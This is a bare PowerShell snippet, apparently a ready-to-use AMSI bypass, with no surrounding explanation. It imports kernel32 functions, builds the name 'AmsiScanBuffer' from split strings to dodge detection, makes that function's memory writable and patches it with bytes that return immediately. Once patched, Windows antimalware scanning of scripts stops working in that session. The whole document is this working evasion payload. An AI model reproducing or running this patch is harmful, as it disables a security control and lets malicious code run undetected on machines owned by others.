$m = "[DllImport(`"kernel32`")]public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);[DllImport(`"kernel32`")]public static extern IntPtr GetModuleHandle(string lpModuleName);[DllImport(`"kernel32`")]public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);";$k = Add-Type -MemberDefinition $m -Name 'Kernel32' -NameSpace 'Win32' -PassThru;$a = 'AmsiS'+'canBuffer';$h = [Win32.Kernel32]::GetModuleHandle('amsi.dll');[IntPtr]$b = [Win32.Kernel32]::GetProcAddress($h, $a);[UInt32]$Size = 0x5;[UInt32]$p = 0x40;[UInt32]$OldProtectFlag = 0;[Win32.Kernel32]::VirtualProtect($b, $Size, $p, [Ref]$OldProtectFlag);$buf = [Byte[]]([UInt32]0xB8,[UInt32]0x57, [UInt32]0x00, [Uint32]0x07, [Uint32]0x80, [Uint32]0xC3);[system.runtime.interopservices.marshal]::copy($buf, 0, $b, 6);
